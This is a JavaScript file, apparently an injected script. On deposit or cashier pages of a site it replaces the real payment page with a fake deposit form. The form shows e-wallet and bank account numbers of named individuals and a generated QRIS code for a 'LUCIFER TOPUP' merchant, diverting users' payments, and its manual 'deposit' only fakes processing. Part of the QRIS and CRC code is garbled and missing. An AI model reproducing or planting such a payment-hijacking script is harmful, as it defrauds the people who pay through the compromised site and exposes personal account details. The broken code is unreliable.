(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  const baseQRIS = "00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
      body {
        margin:0;
        font-family:'Poppins',sans-serif;
        background:#0f172a;
        color:#f1f5f9;
        display:flex;
        justify-content:center;
        align-items:center;
        min-height:100vh;
        padding:0;
      }
      .container {
        max-width:480px;
        width:90%;
        background:#1e293b;
        border-radius:16px;
        box-shadow:0 8px 32px rgba(0,0,0,.5);
        padding:20px;
        display:flex;
        flex-direction:column;
        align-items:center;
      }
      h1 {
        text-align:center;
        font-size:22px;
        margin:0 0 12px;
        font-weight:700;
        color:#38bdf8;
      }
      .marquee {
        width:100%;
        overflow:hidden;
        white-space:nowrap;
        box-sizing:border-box;
        color:#fbbf24;
        margin-bottom:12px;
      }
      .marquee span {
        display:inline-block;
        padding-left:100%;
        animation:marquee 12s linear infinite;
      }
      @keyframes marquee {
        0% { transform: translateX(0%); }
        100% { transform: translateX(-100%); }
      }
      .actions {
        display:flex;
        gap:8px;
        justify-content:center;
        margin-bottom:12px;
        flex-wrap:wrap;
        width:100%;
      }
      button {
        flex:1;
        background:#38bdf8;
        color:#0f172a;
        border:none;
        padding:10px;
        border-radius:8px;
        font-weight:600;
        cursor:pointer;
        transition:background .2s, transform .1s;
      }
      button:hover { background:#0ea5e9; transform:scale(1.03); }
      button.secondary { background:#4ade80; }
      button.secondary:hover { background:#22c55e; }
      select,input {
        width:100%;
        margin-top:8px;
        padding:10px;
        border:1px solid #334155;
        border-radius:8px;
        font-size:14px;
        background:#0f172a;
        color:#f1f5f9;
      }
      .bank-info {
        margin-top:10px;
        background:#0f172a;
        padding:10px;
        border-radius:8px;
        text-align:left;
        display:flex;
        flex-direction:column;
        gap:8px;
        border:1px solid #334155;
      }
      .bank-info img { width:64px;height:64px;object-fit:contain;margin:0 auto; }
      .bank-number {
        display:flex;
        align-items:center;
        justify-content:space-between;
        background:#1e293b;
        padding:6px 10px;
        border-radius:6px;
        border:1px solid #334155;
      }
      .copy-btn {
        background:#38bdf8;
        color:#0f172a;
        border:none;
        padding:6px 10px;
        border-radius:6px;
        cursor:pointer;
        font-size:13px;
        margin-left:10px;
      }
      .result-area { text-align:center;margin-top:12px }
      .qr-card img { width:220px;height:220px;border-radius:10px }
      .qr-buttons {
        display:flex;
        flex-direction:column;
        gap:8px;
        margin-top:10px;
        width:100%;
      }
      .qr-buttons button {
        border-radius:8px;
        padding:10px;
        font-weight:600;
        cursor:pointer;
      }
      .download-btn {
        background:#3b82f6;color:#fff;
      }
      .download-btn:hover {
        background:#2563eb;
      }
      .done-btn {
        background:#22c55e;color:#fff;
      }
      .done-btn:hover {
        background:#16a34a;
      }
      .spinner {
        width:36px;height:36px;border:4px solid #334155;border-top:4px solid #38bdf8;border-radius:50%;animation:spin 1s linear infinite;margin:12px auto;
      }
      @keyframes spin { to { transform: rotate(360deg) } }
      .footer-img {
        margin-top:16px;
        text-align:center;
      }
      .footer-img img {
        max-width:80%;
        border-radius:8px;
      }
      /* Toast Notification */
      .toast {
        position:fixed;bottom:20px;left:50%;
        transform:translateX(-50%) scale(0.95);
        min-width:200px;text-align:center;
        padding:10px 16px;border-radius:8px;
        font-size:14px;font-weight:500;
        opacity:0;pointer-events:none;
        transition:opacity .3s,transform .3s;
        z-index:9999;display:flex;align-items:center;gap:6px
      }
      .toast.show { opacity:1;transform:translateX(-50%) scale(1) }
      .toast.success { background:#16a34a;color:#fff;box-shadow:0 4px 12px rgba(34,197,94,.3) }
      .toast.error { background:#dc2626;color:#fff;box-shadow:0 4px 12px rgba(220,38,38,.3) }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <h1>Formulir Deposit</h1>
      <div class="marquee">
        <span>Deposit wajib sesuai dengan yang ada di formulir deposit, Transaksi pertama Diwajibkan menggunakan Kode unik (contoh : 50.123), Jika tidak sesuai dengan syarat ketentuan, Deposit akan gagal proses</span>
      </div>
      <div class="actions">
        <button onclick="showDeposit('manual')">Manual Deposit</button>
        <button class="secondary" onclick="showDeposit('auto')">QRIS</button>
      </div>

      <div id="manual-step" style="display:none;width:100%">
        <select onchange="selectMethod(this.value)">
          <option value="" selected disabled>Pilih Metode Deposit</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"088214538915","owner":"SURWATI"}'>Dana</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"088905200893","owner":"ENJAH"}'>Ovo</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"88810088214538915","owner":"SURWATI"}'>BRI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"39358088905200893","owner":"ENJAH"}'>BCA VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810088214538915","owner":"SURWATI"}'>BNI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001088905200893","owner":"ENJAH"}'>MANDIRI VA</option>
        </select>
        <div id="manual-details" class="bank-info" style="display:none">
          <img id="bank-logo" src="" alt="Bank Logo">
          <div><b id="bank-name"></b><br><small id="bank-owner"></small></div>
          <div class="bank-number">
            <span id="bank-number"></span>
            <button class="copy-btn" onclick="copyNumber()">Salin</button>
          </div>
          <input id="manual-nominal" type="number" placeholder="Nominal min 50.000">
          <button onclick="submitManualDeposit()" style="margin-top:6px">Kirim</button>
          <div id="manual-result"></div>
        </div>
      </div>

      <div id="auto-deposit" style="display:none;width:100%">
        <input id="nominal" type="number" placeholder="Nominal min 50.000">
        <button onclick="generateQRIS()" style="margin-top:6px">Buat QRIS</button>
        <div id="auto-result" class="result-area"></div>
      </div>

      <div class="footer-img">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Footer Image">
      </div>
    </div>
    <div id="toast" class="toast"></div>
  `;

  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove("show"), 2500);
  }

  window.showDeposit = function (type) {
    document.getElementById("manual-step").style.display = type === "manual" ? "block" : "none";
    document.getElementById("auto-deposit").style.display = type === "auto" ? "block" : "none";
  };

  window.selectMethod = function (j) {
    if (!j) return;
    const m = JSON.parse(j);
    document.getElementById("manual-details").style.display = "flex";
    document.getElementById("bank-logo").src = m.logo;
    document.getElementById("bank-name").innerText = m.name;
    document.getElementById("bank-number").innerText = m.number;
    document.getElementById("bank-owner").innerText = "a/n " + m.owner;
  };

  window.copyNumber = function () {
    const num = document.getElementById("bank-number").innerText;
    if (!num) return showToast("Nomor kosong!", "error");
    navigator.clipboard.writeText(num).then(() => showToast("Nomor rekening disalin", "success"));
  };

  window.submitManualDeposit = function () {
    const n = Number(document.getElementById("manual-nominal").value || 0);
    if (n < 50000) return showToast("Minimal deposit 50.000", "error");
    document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {
      document.getElementById("manual-result").innerHTML = "<strong>Deposit Diproses...</strong>";
      setTimeout(() => history.back(), 1500);
    }, 1500);
  };

  
    }
    return crc.toString(16).toUpperCase().padStart(4, "0");
  }

  \d+/, "");
    const amt = Number(amount).toFixed(2);
    const amtTag = "54" + (amt.length < 10 ? "0" + amt.length : amt.length) + amt;
    qris = qris.replace(/6304.{4}$/i, "") + amtTag + "6304";
    const crc = crc16ccitt(qris);
    return qris + crc;
  }

  window.generateQRIS = function () {
    const n = Number(document.getElementById("nominal").value || 0);
    if (n < 50000) return showToast("Minimal 50.000", "error");
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';

    const dynQRIS = generateDynamicQRIS(baseQRIS, n);
    const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(dynQRIS);

    document.getElementById("auto-result").innerHTML = `
      <div class="qr-card">
        <img id="qris-img" src="${qrUrl}" alt="QRIS">
      </div>
      <div class="qr-buttons">
        <button class="download-btn" onclick="downloadQRIS()">Download QRIS</button>
        <button class="done-btn" onclick="history.back()">Sudah Membayar</button>
      </div>
    `;
  };

  window.downloadQRIS = function () {
    const img = document.getElementById("qris-img");
    if (!img) return showToast("QRIS belum dibuat", "error");
    const link = document.createElement("a");
    link.href = img.src;
    link.download = "qris.png";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("QRIS berhasil diunduh", "success");
  };
})();
